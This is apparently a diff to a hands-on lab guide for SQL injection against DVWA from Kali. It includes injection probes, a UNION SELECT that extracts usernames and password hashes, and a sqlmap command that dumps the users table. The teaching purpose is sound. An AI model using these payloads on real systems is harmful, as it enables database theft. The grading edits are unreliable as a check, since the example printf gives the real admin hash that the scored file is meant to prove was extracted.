@@ -46,7 +46,7 @@ If **Open DVWA** is not available yet on your deployment, use Kali CLI (`curl`) 
 ```
 
 **Done when:** Multiple user rows appear.  
-**Then:** On Kali, capture the injection evidence for scoring:
+**Then:** On Kali, capture real evidence for Manual Check. The browser step alone does not score yet. Use a **curl** you actually ran (you may keep `$TARGET_DVWA`). Replace `<session_id>` with your real `PHPSESSID`. The `id` must be a real probe (`1'`, `1%27`, or an OR payload such as `1' OR '1'='1`). Saving the response to `/tmp/sqli_probe.txt` also counts when that file contains a SQL syntax error, `ID: 1'`, or `First name:`.
 
 ```bash
 # Probe the injection point from Kali with curl and save the response:
@@ -59,7 +59,7 @@ curl -s -b "PHPSESSID=<session_id>; security=low" \
 <details>
 <summary>Hint</summary>
 
-Copy your `PHPSESSID` from browser DevTools → Application → Cookies if using curl/sqlmap later.
+Copy your `PHPSESSID` from browser DevTools → Application → Cookies if using curl/sqlmap later. An `echo` of the payload string is not evidence.
 
 </details>
 
@@ -83,14 +83,16 @@ In the DVWA **User ID** field (browser), try in order:
 1' UNION SELECT user, password FROM users -- -
 ```
 
-On Kali, record evidence (for scoring):
+On Kali, record evidence for Manual Check by saving a line you **saw** in DVWA (username plus the 32-character hex hash), not the UNION sentence itself:
 
 ```bash
-echo "UNION SELECT user, password FROM users" >> /tmp/sqli_users.txt
-# Optionally paste the usernames/hashes you saw into the same file
+printf 'admin:5f4dcc3b5aa765d61d8327deb882cf99\n' > /tmp/sqli_users.txt
+# Replace with a username:hash pair you actually extracted
 ```
 
-**Done when:** You know the database name and can see users/hashes.  
+A file that only contains `UNION SELECT …` will FAIL.
+
+**Done when:** You know the database name and `/tmp/sqli_users.txt` has a real `username:32-hex-hash` line.  
 **Manual Check** on Database Extraction.
 
 <details>
@@ -119,20 +121,20 @@ sqlmap -u "http://$TARGET_DVWA/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
   -D dvwa -T users --dump --batch
 ```
 
-Optional flag file:
+Keep `$TARGET_DVWA`. Replace only `<session_id>` with the real `PHPSESSID`. After the dump, write the admin hash (32 hex characters) into `/tmp/admin_hash.txt`:
 
 ```bash
-# Paste the admin password hash from the dump:
-echo '<admin_hash_here>' > /tmp/admin_hash.txt
+# Paste the admin password hash from the dump (32 hex chars only):
+printf '5f4dcc3b5aa765d61d8327deb882cf99\n' > /tmp/admin_hash.txt
 ```
 
-**Done when:** sqlmap dumps the `users` table (or `/tmp/admin_hash.txt` is non-empty).  
+**Done when:** sqlmap has dumped `users` on Kali **and** `/tmp/admin_hash.txt` contains a 32-hex hash. A non-empty file alone is not enough. `/tmp/sqlmap_output.txt` is not scored.  
 **Manual Check** on Admin Hash.
 
 <details>
 <summary>Hint</summary>
 
-SQLMap **must** run on Kali so scoring sees it. Running sqlmap only on your laptop will not complete Milestone 3.
+SQLMap **must** run on Kali so scoring sees it. Running sqlmap only on your laptop will not complete Milestone 3. Do not leave `<session_id>` or `<admin_hash_here>` in the commands or files.
 
 </details>
 
